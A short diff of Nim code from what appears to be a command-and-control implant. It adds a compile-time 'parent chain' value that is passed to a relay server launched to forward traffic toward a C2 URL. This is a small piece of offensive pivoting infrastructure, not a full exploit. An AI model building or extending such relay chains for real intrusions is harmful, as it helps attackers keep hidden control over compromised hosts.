@@ -1506,8 +1506,16 @@ proc httpHandler() {.async.} =
                         when defined debug:
                             echo "[RELAY] 🎯 C2 URL: " & c2Url
                         
+                        # Get our own RELAY_CHAIN (parent chain) for forwarding
+                        const RELAY_CHAIN {.strdefine.}: string = ""
+                        var parentChain = ""
+                        when RELAY_CHAIN != "":
+                            parentChain = RELAY_CHAIN
+                            when defined debug:
+                                echo "[RELAY] 🔗 Our parent chain: " & parentChain
+                        
                         # Start relay server in background (non-blocking)
-                        let started = relay_launcher.startRelayServerWithPort(port, listener.id, c2Url)
+                        let started = relay_launcher.startRelayServerWithPort(port, listener.id, parentChain, c2Url)
                         
                         # Send response immediately (don't wait for server loop)
                         if started:
